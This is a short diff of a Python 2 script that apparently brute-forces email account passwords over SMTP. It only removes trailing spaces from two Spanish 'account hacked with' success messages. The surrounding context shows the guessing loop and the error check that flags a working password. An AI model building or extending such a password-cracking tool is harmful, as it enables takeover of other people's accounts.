@@ -52,14 +52,14 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] La cuanta a sido hackeada con :' + password + '     '
+         print '[+] La cuanta a sido hackeada con :' + password
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] La cuanta a sido hackeada con :' + password + '     '
+            print '[+] La cuanta a sido hackeada con :' + password 
 
             break
          else:
